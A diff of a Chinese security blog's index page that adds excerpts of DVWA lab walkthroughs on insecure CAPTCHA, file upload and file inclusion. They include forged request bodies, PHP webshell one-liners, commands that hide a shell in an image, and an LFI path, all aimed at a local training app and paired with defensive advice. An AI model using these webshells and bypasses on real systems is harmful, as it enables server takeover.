@@ -120,7 +120,7 @@
 
 
 <nav class="site-nav">
-  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">352</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">133</span></a></li>
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">357</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">136</span></a></li>
       <li class="menu-item menu-item-search">
         <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
         </a>
@@ -185,18 +185,18 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">133</span>
+          <span class="site-state-item-count">136</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-count">4</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">352</span>
+        <span class="site-state-item-count">357</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -221,6 +221,570 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/11/DVWA-Insecure-CAPTCHA%E4%B8%8D%E5%AE%89%E5%85%A8%E9%AA%8C%E8%AF%81%E7%A0%81%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="l1n6yun">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="l1n6yun's Blog">
+      <meta itemprop="description" content="chitanda | 互联网 | 前端 | 宅 | 动漫 | 京阿尼">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | l1n6yun's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/02/11/DVWA-Insecure-CAPTCHA%E4%B8%8D%E5%AE%89%E5%85%A8%E9%AA%8C%E8%AF%81%E7%A0%81%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/" class="post-title-link" itemprop="url">DVWA Insecure CAPTCHA 不安全验证码通关教程</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-02-11 10:00:00" itemprop="dateCreated datePublished" datetime="2021-02-11T10:00:00+08:00">2021-02-11</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">安全</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>验证码这东西，本来是用来区分人和机器的。但如果验证码机制写得有问题，那跟没有也差不多，暴力破解、批量注册什么的照样搞。</p>
+<p>这关主要学怎么绕过不安全的验证码。</p>
+<h2 id="验证码类型"><a href="#验证码类型" class="headerlink" title="验证码类型"></a>验证码类型</h2><p>先了解下常见的验证码：</p>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>图形验证码</td>
+<td>识别图片里的字符</td>
+</tr>
+<tr>
+<td>短信验证码</td>
+<td>手机收验证码</td>
+</tr>
+<tr>
+<td>邮箱验证码</td>
+<td>邮箱收验证码</td>
+</tr>
+<tr>
+<td>滑动验证码</td>
+<td>拖滑块到指定位置</td>
+</tr>
+<tr>
+<td>点击验证码</td>
+<td>按顺序点文字</td>
+</tr>
+</tbody></table>
+<h2 id="Low-级别"><a href="#Low-级别" class="headerlink" title="Low 级别"></a>Low 级别</h2><p>Low 级别用的是 reCAPTCHA，但验证逻辑有问题：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="variable">$hide</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;step&#x27;</span> ];</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$hide</span> == <span class="string">&#x27;1&#x27;</span> ) &#123;</span><br><span class="line">        <span class="comment">// 第一步：输入验证码</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>( <span class="variable">$hide</span> == <span class="string">&#x27;2&#x27;</span> ) &#123;</span><br><span class="line">        <span class="comment">// 第二步：直接改密码，不验证验证码</span></span><br><span class="line">        <span class="variable">$pass_new</span>  = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">        <span class="variable">$pass_conf</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>流程分两步，但第二步根本不检查验证码，直接跳到第二步就行了。</p>
+<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><ol>
+<li>抓包拦截改密码请求</li>
+<li>把 <code>step=1</code> 改成 <code>step=2</code></li>
+<li>删掉验证码相关参数</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">step=2&amp;password_new=hacked&amp;password_conf=hacked&amp;Change=Change</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>发送，密码改完了</li>
+</ol>
+<p>验证码成了摆设。</p>
+<h2 id="Medium-级别"><a href="#Medium-级别" class="headerlink" title="Medium 级别"></a>Medium 级别</h2><p>Medium 级别在第二步检查了 <code>passed_captcha</code> 参数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="variable">$hide</span> == <span class="string">&#x27;2&#x27;</span> &amp;&amp; <span class="variable">$_POST</span>[ <span class="string">&#x27;passed_captcha&#x27;</span> ] == <span class="string">&#x27;true&#x27;</span> ) &#123;</span><br><span class="line">    <span class="comment">// 改密码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但问题是这参数是客户端传过来的，想传啥都行。</p>
+<h3 id="绕过方法-1"><a href="#绕过方法-1" class="headerlink" title="绕过方法"></a>绕过方法</h3><ol>
+<li>抓包</li>
+<li>加个 <code>passed_captcha=true</code> 参数</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">step=2&amp;passed_captcha=true&amp;password_new=hacked&amp;password_conf=hacked&amp;Change=Change</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>发送，又绕过去了</li>
+</ol>
+<p>客户端传来的东西哪能信啊。</p>
+<h2 id="High-级别"><a href="#High-级别" class="headerlink" title="High 级别"></a>High 级别</h2><p>High 级别用 reCAPTCHA API 验证：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$resp</span> = <span class="title function_ invoke__">recaptcha_check_answer</span>(</span><br><span class="line">    <span class="variable">$_DVWA</span>[ <span class="string">&#x27;recaptcha_private_key&#x27;</span> ],</span><br><span class="line">    <span class="variable">$_POST</span>[<span class="string">&quot;recaptcha_challenge_field&quot;</span>],</span><br><span class="line">    <span class="variable">$_POST</span>[<span class="string">&quot;recaptcha_response_field&quot;</span>]</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( !<span class="variable">$resp</span>-&gt;is_valid ) &#123;</span><br><span class="line">    <span class="comment">// 验证码错误</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 通过，改密码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个真去调 Google API 验证了，不太好搞。</p>
+<h3 id="绕过方法-2"><a href="#绕过方法-2" class="headerlink" title="绕过方法"></a>绕过方法</h3><p><strong>禁用 JavaScript：</strong></p>
+<p>有些验证码依赖前端 JS，禁用浏览器 JS 可能就失效了。</p>
+<p><strong>重放攻击：</strong></p>
+<p>如果验证码没做一次性使用，抓到验证成功的请求可以重复用。</p>
+<p><strong>伪造响应：</strong></p>
+<p>如果能拦截 API 响应，可以改成验证成功。</p>
+<p>不过说实话，到 High 级别再绕已经比较难了，正常情况下不太现实。</p>
+<h2 id="Impossible-级别"><a href="#Impossible-级别" class="headerlink" title="Impossible 级别"></a>Impossible 级别</h2><p>Impossible 级别是正确做法：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$resp</span> = <span class="title function_ invoke__">recaptcha_check_answer</span>(</span><br><span class="line">    <span class="variable">$_DVWA</span>[ <span class="string">&#x27;recaptcha_private_key&#x27;</span> ],</span><br><span class="line">    <span class="variable">$_POST</span>[<span class="string">&quot;recaptcha_challenge_field&quot;</span>],</span><br><span class="line">    <span class="variable">$_POST</span>[<span class="string">&quot;recaptcha_response_field&quot;</span>]</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( !<span class="variable">$resp</span>-&gt;is_valid ) &#123;</span><br><span class="line">    <span class="title function_ invoke__">dvwaMessagePush</span>( <span class="string">&quot;reCAPTCHA incorrect&quot;</span> );</span><br><span class="line">    <span class="title function_ invoke__">log_event</span>( <span class="string">&quot;CAPTCHA failed for user: &quot;</span> . <span class="title function_ invoke__">dvwaCurrentUser</span>() );</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br></pre></td></tr></table></figure>
+
+<p>服务端验证，还加了 CSRF Token，验证失败还记日志。这才是正经的验证码实现。</p>
+<h2 id="常见绕过方式"><a href="#常见绕过方式" class="headerlink" title="常见绕过方式"></a>常见绕过方式</h2><table>
+<thead>
+<tr>
+<th>绕过方式</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>参数篡改</td>
+<td>改验证相关参数</td>
+</tr>
+<tr>
+<td>流程跳过</td>
+<td>直接跳过验证步骤</td>
+</tr>
+<tr>
+<td>重放攻击</td>
+<td>验证成功的请求重复用</td>
+</tr>
+<tr>
+<td>禁用 JS</td>
+<td>有些前端验证能绕</td>
+</tr>
+<tr>
+<td>打码平台</td>
+<td>人工识别</td>
+</tr>
+<tr>
+<td>OCR 识别</td>
+<td>自动识别简单验证码</td>
+</tr>
+</tbody></table>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>验证码防护要点：</p>
+<ol>
+<li>一定要在服务端验证，客户端的东西都不能信</li>
+<li>验证码用完就失效，别让人重复用</li>
+<li>设个有效期，过期作废</li>
+<li>错误太多次就锁定</li>
+<li>用成熟的方案，别自己瞎写</li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/10/DVWA-File-Upload%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="l1n6yun">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="l1n6yun's Blog">
+      <meta itemprop="description" content="chitanda | 互联网 | 前端 | 宅 | 动漫 | 京阿尼">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | l1n6yun's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/02/10/DVWA-File-Upload%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/" class="post-title-link" itemprop="url">DVWA File Upload 文件上传通关教程</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-02-10 10:00:00" itemprop="dateCreated datePublished" datetime="2021-02-10T10:00:00+08:00">2021-02-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">安全</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>文件上传漏洞，简单说就是能上传不该上传的东西，比如 WebShell。一旦传上去个 PHP 木马，服务器基本就归你了。这玩意危害是真的大。</p>
+<p>这关主要学怎么绕过各种上传限制，拿到 WebShell。</p>
+<h2 id="常用-WebShell"><a href="#常用-WebShell" class="headerlink" title="常用 WebShell"></a>常用 WebShell</h2><p>先准备几个常用的：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>简单粗暴，一个参数接收命令就完事。</p>
+<h2 id="Low-级别"><a href="#Low-级别" class="headerlink" title="Low 级别"></a>Low 级别</h2><p>看代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$target_path</span> .= <span class="title function_ invoke__">basename</span>( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">move_uploaded_file</span>( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ], <span class="variable">$target_path</span> ) ) &#123;</span><br><span class="line">    <span class="comment">// 上传成功</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>啥检查都没有，直接保存，爱传啥传啥。</p>
+<h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><ol>
+<li>写个 <code>shell.php</code>，内容 <code>&lt;?php @eval($_POST[&#39;cmd&#39;]); ?&gt;</code></li>
+<li>直接上传</li>
+<li>访问 <code>http://localhost:3892/hackable/uploads/shell.php</code></li>
+<li>拿蚁剑或者菜刀连上去，服务器就是你的了</li>
+</ol>
+<p>太简单了，没啥好说的。</p>
+<h2 id="Medium-级别"><a href="#Medium-级别" class="headerlink" title="Medium 级别"></a>Medium 级别</h2><p>Medium 检查了 Content-Type 和文件大小：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uploaded_type</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;type&#x27;</span> ];</span><br><span class="line"><span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( ( <span class="variable">$uploaded_type</span> == <span class="string">&quot;image/jpeg&quot;</span> || <span class="variable">$uploaded_type</span> == <span class="string">&quot;image/png&quot;</span> ) &amp;&amp;</span><br><span class="line">    ( <span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span> ) ) &#123;</span><br><span class="line">    <span class="comment">// 允许上传</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>只检查请求头里的 Content-Type，这玩意前端改不了但抓包工具能改。</p>
+<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><p><strong>改 Content-Type：</strong></p>
+<ol>
+<li>上传 shell.php，Burp 抓包</li>
+<li>把 <code>Content-Type: application/octet-stream</code> 改成 <code>Content-Type: image/jpeg</code></li>
+</ol>
+<p><img data-src="/images/pasted-101.png" alt="upload successful"></p>
+<ol start="3">
+<li>放行，上传成功</li>
+</ol>
+<p><img data-src="/images/pasted-102.png" alt="upload successful"></p>
+<p><strong>图片马：</strong></p>
+<p>也可以做个图片马，把 PHP 代码塞图片里：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy normal.jpg/b + shell.php/a webshell.jpg</span><br></pre></td></tr></table></figure>
+
+<p>或者直接追加：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;?php @eval(<span class="variable">$_POST</span>[&#x27;cmd&#x27;]); ?&gt;&quot;</span> &gt;&gt; image.jpg</span><br></pre></td></tr></table></figure>
+
+<p>不过图片马需要配合文件包含漏洞才能执行，后面会说。</p>
+<h2 id="High-级别"><a href="#High-级别" class="headerlink" title="High 级别"></a>High 级别</h2><p>High 级别检查后缀和图片特征了：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uploaded_ext</span>  = <span class="title function_ invoke__">substr</span>( <span class="variable">$uploaded_name</span>, <span class="title function_ invoke__">strrpos</span>( <span class="variable">$uploaded_name</span>, <span class="string">&#x27;.&#x27;</span> ) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( ( <span class="title function_ invoke__">strtolower</span>( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;jpg&quot;</span> || <span class="title function_ invoke__">strtolower</span>( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;jpeg&quot;</span> ||</span><br><span class="line">      <span class="title function_ invoke__">strtolower</span>( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;png&quot;</span> ) &amp;&amp;</span><br><span class="line">    ( <span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span> ) &amp;&amp;</span><br><span class="line">    <span class="title function_ invoke__">getimagesize</span>( <span class="variable">$uploaded_tmp</span> ) ) &#123;</span><br><span class="line">    <span class="comment">// 允许上传</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>检查了：</p>
+<ol>
+<li>后缀必须是 jpg、jpeg、png</li>
+<li>文件要小于 100KB</li>
+<li><code>getimagesize()</code> 验证是不是真图片</li>
+</ol>
+<h3 id="绕过方法-1"><a href="#绕过方法-1" class="headerlink" title="绕过方法"></a>绕过方法</h3><p>单纯改后缀和 Content-Type 不行了，得做图片马配合文件包含。</p>
+<p><strong>步骤 1：做图片马</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy logo.png/b + shell.php/a webshell.png</span><br></pre></td></tr></table></figure>
+
+<p>这样图片里就包含 PHP 代码了。</p>
+<p><strong>步骤 2：上传</strong></p>
+<p>上传 webshell.png，因为是真的图片，能过 <code>getimagesize()</code> 检查。</p>
+<p><strong>步骤 3：文件包含执行</strong></p>
+<p>图片本身不会执行 PHP，得用文件包含漏洞：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:3892/vulnerabilities/fi/?page=../../hackable/uploads/webshell.png</span><br></pre></td></tr></table></figure>
+
+<p><strong>步骤 4：蚁剑连接</strong></p>
+<p>URL 填文件包含的地址，就能连上 WebShell 了。</p>
+<h2 id="Impossible-级别"><a href="#Impossible-级别" class="headerlink" title="Impossible 级别"></a>Impossible 级别</h2><p>Impossible 级别是真安全：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$target_file</span>   = <span class="title function_ invoke__">md5</span>( <span class="title function_ invoke__">uniqid</span>() . <span class="variable">$uploaded_name</span> ) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$uploaded_ext</span>;</span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$uploaded_type</span> == <span class="string">&#x27;image/jpeg&#x27;</span> || <span class="variable">$uploaded_type</span> == <span class="string">&#x27;image/png&#x27;</span> ) &#123;</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$uploaded_type</span> == <span class="string">&#x27;image/jpeg&#x27;</span> ) &#123;</span><br><span class="line">        <span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatefromjpeg</span>( <span class="variable">$uploaded_tmp</span> );</span><br><span class="line">        <span class="title function_ invoke__">imagejpeg</span>( <span class="variable">$img</span>, <span class="variable">$temp_file</span>, <span class="number">100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>图片会用 GD 库重新生成一遍，里面夹带的恶意代码全都没了。文件名还是随机 MD5，想猜都猜不到。</p>
+<h2 id="常见绕过方式总结"><a href="#常见绕过方式总结" class="headerlink" title="常见绕过方式总结"></a>常见绕过方式总结</h2><table>
+<thead>
+<tr>
+<th>绕过方式</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>改 Content-Type</td>
+<td>抓包改 MIME 类型</td>
+</tr>
+<tr>
+<td>双写后缀</td>
+<td><code>shell.php.php</code></td>
+</tr>
+<tr>
+<td>大小写混淆</td>
+<td><code>shell.PhP</code></td>
+</tr>
+<tr>
+<td>特殊后缀</td>
+<td><code>.php5</code>、<code>.phtml</code></td>
+</tr>
+<tr>
+<td>空字节截断</td>
+<td><code>shell.php%00.jpg</code>（老版本 PHP）</td>
+</tr>
+<tr>
+<td>图片马</td>
+<td>配合文件包含</td>
+</tr>
+<tr>
+<td>.htaccess</td>
+<td>让服务器把图片当 PHP 执行</td>
+</tr>
+<tr>
+<td>条件竞争</td>
+<td>上传后赶在删除前访问</td>
+</tr>
+</tbody></table>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>文件上传防护要点：</p>
+<ol>
+<li>白名单限制后缀，别用黑名单</li>
+<li>检查文件真实类型，别只看 Content-Type</li>
+<li>图片最好重绘一遍，去恶意代码</li>
+<li>文件名随机化，别保留原名</li>
+<li>上传目录禁止执行脚本</li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/08/DVWA-File-Inclusion%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="l1n6yun">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="l1n6yun's Blog">
+      <meta itemprop="description" content="chitanda | 互联网 | 前端 | 宅 | 动漫 | 京阿尼">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | l1n6yun's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/02/08/DVWA-File-Inclusion%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/" class="post-title-link" itemprop="url">DVWA File Inclusion 文件包含通关教程</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-02-08 10:00:00" itemprop="dateCreated datePublished" datetime="2021-02-08T10:00:00+08:00">2021-02-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">安全</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>文件包含漏洞，顾名思义就是用户输入被拿去包含了不该包含的文件。分两种：</p>
+<ul>
+<li><strong>LFI（本地文件包含）</strong>：只能读服务器本地的文件</li>
+<li><strong>RFI（远程文件包含）</strong>：能包含远程服务器上的文件，危害更大</li>
+</ul>
+<p>这关主要学怎么利用这个漏洞读敏感文件和执行恶意代码。</p>
+<h2 id="Low-级别"><a href="#Low-级别" class="headerlink" title="Low 级别"></a>Low 级别</h2><p>看代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"><span class="keyword">include</span>( <span class="variable">$file</span> );</span><br></pre></td></tr></table></figure>
+
+<p>用户输入直接丢给 <code>include()</code>，一点过滤都没有，想包含啥都行。</p>
+<h3 id="本地文件包含（LFI）"><a href="#本地文件包含（LFI）" class="headerlink" title="本地文件包含（LFI）"></a>本地文件包含（LFI）</h3><p>读一下 <code>/etc/passwd</code>：</p>
